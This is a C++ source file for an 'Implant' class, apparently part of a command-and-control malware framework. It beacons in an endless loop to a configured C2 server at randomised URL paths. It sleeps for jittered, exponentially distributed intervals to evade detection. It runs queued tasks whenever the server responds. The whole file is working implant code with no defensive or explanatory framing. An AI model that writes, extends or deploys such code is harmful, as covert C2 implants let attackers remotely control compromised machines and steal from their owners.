#include "Implant.hpp"

Implant::Implant() : isC2ServerRunning(false), taskManager() {}


void Implant::performTasks()
{
	this->taskManager.processTasks();
}


void Implant::beacon()
{
	std::string randomString = this->generateRandomString();
	std::string path = "/api/" + randomString;
	std::string urlServer = Config::URL_SERVER + path;
	cpr::Response response = cpr::GetAsync(cpr::Url{ urlServer }).get();
	this->isC2ServerRunning = response.status_code >= 200 && response.status_code <= 404;
}


std::string Implant::generateRandomString()
{
	const char* CHARACTERS = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	const int CHARACTERS_LENGTH = 61;
	const int MIN_LENGTH = 6;
	const int MAX_LENGTH = 30;
	std::uniform_int_distribution<> index_dist(0, CHARACTERS_LENGTH);
	std::uniform_int_distribution<> length_dist(MIN_LENGTH, MAX_LENGTH);
	std::mt19937 generator(this->randomdevice());
	std::string result = "";
	int length_s = length_dist(generator);
	for (std::size_t i = 0; i < length_s; ++i)
	{
		result.push_back(CHARACTERS[index_dist(generator)]);
	}
	
	return result;
}


void Implant::sleepBeacon()
{
	auto time = this->expdistribution(this->randomdevice);
	const auto secondsDouble = std::chrono::duration<double>(time);
	const auto secondsChrono = std::chrono::duration_cast<std::chrono::seconds>(secondsDouble);
	std::this_thread::sleep_for(std::chrono::seconds(secondsChrono));
}


void Implant::run()
{
	while (true) {
		this->beacon();
		if (this->isC2ServerRunning) {
			this->performTasks();
		}
		
		this->sleepBeacon();
	}
}
